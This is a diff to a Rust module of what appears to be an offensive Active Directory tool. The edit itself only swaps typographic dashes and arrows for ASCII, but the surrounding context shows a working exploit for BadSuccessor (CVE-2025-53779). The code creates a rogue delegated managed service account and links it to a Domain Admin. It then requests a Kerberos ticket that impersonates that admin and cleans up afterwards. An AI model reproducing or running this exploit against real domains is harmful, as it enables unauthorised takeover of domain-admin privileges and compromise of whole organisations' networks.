@@ -1,11 +1,11 @@
-//! BadSuccessor (CVE-2025-53779) — dMSA privilege escalation for WS2025.
+//! BadSuccessor (CVE-2025-53779) -- dMSA privilege escalation for WS2025.
 //!
 //! Attack flow:
 //! 1. Enumerate OUs where the authenticated user has `CreateChild` on `msDS-DelegatedManagedServiceAccount`
 //! 2. Create a rogue dMSA object with a known password
 //! 3. Set `msDS-DelegatedMSAState = 2` (migrating state)
-//! 4. Set `msDS-ManagedAccountPrecededByLink` → Domain Admin DN
-//! 5. Set `msDS-AllowedToDelegateTo` → any target SPN
+//! 4. Set `msDS-ManagedAccountPrecededByLink` -> Domain Admin DN
+//! 5. Set `msDS-AllowedToDelegateTo` -> any target SPN
 //! 6. Use the dMSA to authenticate as the linked DA account
 //!
 //! Reference: https://www.secureauth.com/blog/badsuccessor/
@@ -117,12 +117,12 @@ pub async fn exploit_bad_successor(
         .as_secs();
     log.push("BadSuccessor exploit starting...".to_string());
 
-    // ── Step 1: Find a writable OU or Container ─────────────────
+    // -- Step 1: Find a writable OU or Container -----------------
     log.push("Phase 1: Finding writable OU...".to_string());
     let writable_ou = find_writable_ou(ldap).await?;
     log.push(format!("  Writable OU: {}", writable_ou));
 
-    // ── Step 2: Get domain SID ──────────────────────────────────
+    // -- Step 2: Get domain SID ----------------------------------
     let domain_sid = get_domain_sid(ldap).await?;
     log.push(format!("  Domain SID: {}", domain_sid));
 
@@ -132,7 +132,7 @@ pub async fn exploit_bad_successor(
         rand::random::<u32>() & 0x3FFFFF
     );
 
-    // ── Step 3: Create the rogue dMSA ───────────────────────────
+    // -- Step 3: Create the rogue dMSA ---------------------------
     log.push("Phase 2: Creating rogue dMSA object...".to_string());
     let dmsa_name = format!("BDS-{:x}", ts);
     let dmsa_dn = format!("CN={},{}", dmsa_name, writable_ou);
@@ -166,7 +166,7 @@ pub async fn exploit_bad_successor(
     // Small delay for replication
     tokio::time::sleep(std::time::Duration::from_millis(500)).await;
 
-    // ── Step 4: Link to Domain Admin via migration attribute ────
+    // -- Step 4: Link to Domain Admin via migration attribute ----
     log.push("Phase 3: Linking dMSA to DA...".to_string());
     ldap.modify_replace(
         &dmsa_dn,
@@ -176,16 +176,16 @@ pub async fn exploit_bad_successor(
     .await?;
     log.push(format!("  Linked to DA: {}", target_da_dn));
 
-    // ── Step 5: Request TGT as the dMSA ─────────────────────────
+    // -- Step 5: Request TGT as the dMSA -------------------------
     // The KDC treats a migrating dMSA (state=2) as the linked account.
     // When we request a TGT for the dMSA, the KDC issues a ticket
     // with the linked DA's privileges.
     log.push("Phase 4: Requesting TGT as dMSA (DA impersonation)...".to_string());
     let dmsa_sam = format!("{}$", dmsa_name);
     let tgt = request_tgt(dc_ip, domain, &dmsa_sam, &password, false).await?;
-    log.push(format!("  TGT obtained — impersonating {}", target_da_dn));
+    log.push(format!("  TGT obtained -- impersonating {}", target_da_dn));
 
-    // ── Step 6: Cleanup ─────────────────────────────────────────
+    // -- Step 6: Cleanup -----------------------------------------
     let mut cleaned_up = false;
     if auto_cleanup {
         log.push("Phase 5: Cleaning up...".to_string());
@@ -199,7 +199,7 @@ pub async fn exploit_bad_successor(
     }
 
     info!(
-        "BadSuccessor exploit completed — TGT obtained for {}",
+        "BadSuccessor exploit completed -- TGT obtained for {}",
         target_da_dn
     );
     Ok(BadSuccessorResult {
@@ -257,7 +257,7 @@ async fn find_writable_ou(ldap: &mut LdapSession) -> Result<String> {
     }
 
     Err(OverthroneError::custom(
-        "No writable OU found — requires CreateChild on msDS-DelegatedManagedServiceAccount",
+        "No writable OU found -- requires CreateChild on msDS-DelegatedManagedServiceAccount",
     ))
 }
 
